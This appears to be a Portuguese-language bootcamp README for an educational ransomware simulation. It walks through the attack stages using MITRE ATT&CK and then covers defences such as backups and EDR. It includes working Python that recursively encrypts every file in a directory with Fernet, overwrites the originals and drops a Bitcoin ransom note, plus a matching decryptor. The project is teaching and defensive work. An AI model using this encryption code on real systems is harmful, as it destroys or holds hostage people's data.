# 🔒 Ransomware

> ⚠️ **Aviso importante:** Este projeto tem finalidade estritamente educacional, desenvolvido em ambiente isolado e controlado como parte do Santander Bootcamp 2025. Nunca execute código deste tipo fora de um ambiente autorizado. O desenvolvimento e uso de ransomware real configura crime em praticamente todas as jurisdições, incluindo o Brasil (Lei nº 12.737/2012 — Lei Carolina Dieckmann, e Lei nº 14.155/2021).

---

## 📌 O que é um Ransomware?

Ransomware é uma categoria de malware cujo objetivo é sequestrar o acesso da vítima aos seus próprios dados — geralmente por meio de criptografia dos arquivos — e exigir o pagamento de um resgate (*ransom*, em inglês) em troca da chave que permite a recuperação. O pagamento é quase sempre exigido em criptomoedas (Bitcoin, Monero), dificultando o rastreamento.

Ataques reais de ransomware já paralisaram hospitais, infraestruturas críticas, órgãos governamentais e grandes corporações. O **WannaCry** (2017) infectou mais de 200 mil sistemas em 150 países explorando uma vulnerabilidade no protocolo SMB do Windows. O grupo **REvil** (2021) chegou a exigir 70 milhões de dólares após um único ataque à empresa Kaseya. O custo médio de recuperação de um ataque de ransomware, incluindo tempo de inatividade e danos à reputação, ultrapassa hoje 4 milhões de dólares.

---

## ⚙️ Como Funciona na Prática

Um ataque de ransomware real segue, de forma geral, as etapas abaixo — referenciadas também no framework **MITRE ATT&CK**:

### 1. Vetor de Entrada (Initial Access)
O atacante obtém acesso ao sistema da vítima. Os principais vetores são phishing com anexo malicioso, exploração de vulnerabilidades em serviços expostos (RDP, VPN, SMB) ou uso de credenciais vazadas. Nesta simulação, a execução é feita diretamente pelo analista em ambiente controlado, pulando esta etapa.

### 2. Execução e Persistência (Execution / Persistence)
O payload é executado. Em ataques sofisticados, o malware garante persistência via chaves de registro do Windows, tarefas agendadas ou serviços do sistema, sobrevivendo a reinicializações antes mesmo de iniciar a criptografia.

### 3. Reconhecimento Local (Discovery)
O malware percorre o sistema de arquivos mapeando arquivos de interesse — documentos, imagens, bancos de dados, backups locais. Extensões como `.docx`, `.pdf`, `.jpg`, `.sql` e `.bak` costumam ser priorizadas.

Nesta simulação, isso é feito pela função responsável por listar todos os arquivos do diretório atual, excluindo os scripts do próprio projeto:

```python
def encontrar_arquivos(diretorio):
    lista_arquivos = []
    for root, dirs, files in os.walk(diretorio):
        for nome in files:
            path = os.path.join(root, nome)
            if nome != "main.py" and nome != "descriptografar.py" and not nome.endswith(".key"):
                lista_arquivos.append(path)
    return lista_arquivos
```

### 4. Geração e Proteção da Chave (Impact — Preparation)
Uma chave criptográfica é gerada localmente. Em ataques reais, essa chave é imediatamente enviada ao servidor de Comando e Controle (C2) do atacante **antes** de qualquer arquivo ser cifrado — garantindo que a vítima jamais tenha acesso a ela. O arquivo local da chave, se existir, é deletado após o envio.

Nesta simulação, para fins didáticos, a chave é armazenada localmente em `chave.key`. A biblioteca utilizada é a **Fernet**, parte do pacote `cryptography` do Python, que implementa criptografia simétrica AES-128 em modo CBC com autenticação HMAC-SHA256:

```python
# Gerar chave de criptografia
def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_arquivo:
        chave_arquivo.write(chave)

# Carregar chave
def carregar_chave():
    return open("chave.key", "rb").read()
```

### 5. Criptografia dos Arquivos (Impact — Data Encrypted for Impact)
Cada arquivo encontrado é lido em modo binário, cifrado com a chave Fernet e reescrito no disco com o conteúdo criptografado. O arquivo original é sobrescrito — não há versão "antes" recuperável sem a chave:

```python
# Criptografar arquivo
def criptografar_arquivo(arquivo, chave):
    chave = Fernet(chave)
    with open(arquivo, "rb") as arq:
        dados = arq.read()
    dados_criptografados = chave.encrypt(dados)
    with open(arquivo, "wb") as arq:
        arq.write(dados_criptografados)

# Encontrar arquivos para criptograr
def encontrar_arquivos(diretorio):
    lista_arquivos = []
    for root, dirs, files in os.walk(diretorio):
        for nome in files:
            path = os.path.join(root, nome)
            if nome != "main.py" and nome != "descriptografar.py" and not nome.endswith(".key"):
                lista_arquivos.append(path)
    return lista_arquivos
```

### 6. Entrega da Mensagem de Resgate (Impact)
Um arquivo de texto é criado no diretório raiz, contendo as instruções de pagamento, o endereço de destino (carteira de criptomoeda) e o prazo para pagamento. Em ataques reais, esse arquivo é depositado em todas as pastas afetadas, e frequentemente a área de trabalho e o plano de fundo do sistema são alterados para exibir a mensagem:

```python
# Mensagem de resgate
def mensagem_resgate():
    with open("RECUPERAR OS DADOS.txt", "w") as arquivo:
        arquivo.write('''Seus arquivos foram criptografados!
Para recuperar seus arquivos, envie 1 Bitcoin e o comprovante para o endereço abaixo:
a1b2d3c4e5f6...
Após isso, será enviada a chave de descriptografia.
Você tem 12 horas para realizar o pagamento, caso contrário, todos os dados serão permanentemente excluídos, sem possibilidade de recuperação.''')
```

### 7. Descriptografia (mediante fornecimento da chave)
Em ataques reais, após confirmação do pagamento, o atacante fornece a chave ou um decryptor. Nesta simulação, o script `descriptografar.py` replica esse processo — ele lê a chave armazenada localmente e reverte a criptografia de todos os arquivos:

```python
# Carregar chave
def carregar_chave():
    return open("chave.key", "rb").read()

# Descriptografar arquivos
def descriptografar_arquivo(arquivo, chave):
    chave = Fernet(chave)
    with open(arquivo, "rb") as arq:
        dados_criptografados = arq.read()
        dados_descriptografados = chave.decrypt(dados_criptografados)
    with open(arquivo, "wb") as arq:
        arq.write(dados_descriptografados)

# Encontrar arquivos para descriptografar
def encontrar_arquivos(diretorio):
    lista_arquivos = []
    for root, dirs, files in os.walk(diretorio):
        for nome in files:
            path = os.path.join(root, nome)
            if nome != "main.py" and nome != "RECUPERAR OS DADOS.txt" and nome != "descriptografar.py" and not nome.endswith(".key"):
                lista_arquivos.append(path)
    return lista_arquivos
```

---

## 🛡️ Contramedidas e Estratégias de Defesa

### Backups seguindo a Regra 3-2-1
A defesa mais eficaz contra ransomware. A regra estabelece: manter **3 cópias** dos dados, em **2 mídias diferentes**, com **1 cópia offsite** — fisicamente separada da rede ou em nuvem isolada. Ransomware cifra apenas o que está acessível; o que está desconectado sobrevive intacto. Backups devem ser testados periodicamente — um backup não testado é um backup que pode não funcionar quando mais importar.

### EDR e Antivírus Comportamental
Soluções modernas de *Endpoint Detection and Response* (EDR) vão além da detecção por assinatura: elas monitoram padrões de comportamento. Picos abruptos de operações de escrita em disco, abertura sequencial de centenas de arquivos e chamadas a APIs de criptografia em rápida sucessão são indicadores clássicos da fase de cifragem em massa. Um EDR bem configurado pode interromper o processo nos primeiros segundos.

### Princípio do Menor Privilégio
Um processo executando com permissões limitadas de um usuário padrão não consegue cifrar arquivos do sistema, de outros usuários ou de compartilhamentos de rede aos quais o usuário não tem acesso. Restringir privilégios diminui drasticamente o raio de impacto de uma infecção.

### Segmentação de Rede
Impede que o ransomware se propague lateralmente (movimento lateral no MITRE ATT&CK) para outros endpoints, servidores de arquivos e backups conectados à mesma rede. VLANs, firewalls internos e políticas de acesso baseadas em identidade são ferramentas-chave aqui.

### Conscientização do Usuário
A maioria dos vetores de entrada envolve interação humana — phishing, engenharia social, anexos maliciosos. Treinamentos regulares, simulações de phishing e políticas claras sobre abertura de e-mails e anexos reduzem significativamente a superfície de ataque humana, que frequentemente é o elo mais fraco da cadeia.

### Sandboxing
Execução de arquivos suspeitos em ambientes virtualizados e isolados antes de permitir acesso ao sistema principal. Permite identificar comportamento malicioso (acesso massivo a arquivos, conexões C2, modificação do registro) sem qualquer risco ao ambiente real.

### Patch Management
Vulnerabilidades em sistemas operacionais e aplicativos são frequentemente exploradas como vetor de entrada. O WannaCry, por exemplo, explorou o EternalBlue — uma vulnerabilidade para a qual a Microsoft havia lançado patch semanas antes do ataque. Manter sistemas atualizados fecha essa janela de exposição.

---

## 🔗 Referências

- MITRE ATT&CK — Técnica T1486 (Data Encrypted for Impact): https://attack.mitre.org/techniques/T1486/
- CISA Ransomware Guide: https://www.cisa.gov/stopransomware
- NIST SP 800-61 Rev. 2 — Computer Security Incident Handling Guide
- Lei nº 14.155/2021 — Crimes cibernéticos no Brasil

---

*Projeto desenvolvido como parte do Santander Bootcamp 2025 — Unidade 5: Segurança Ofensiva e Defensiva.*
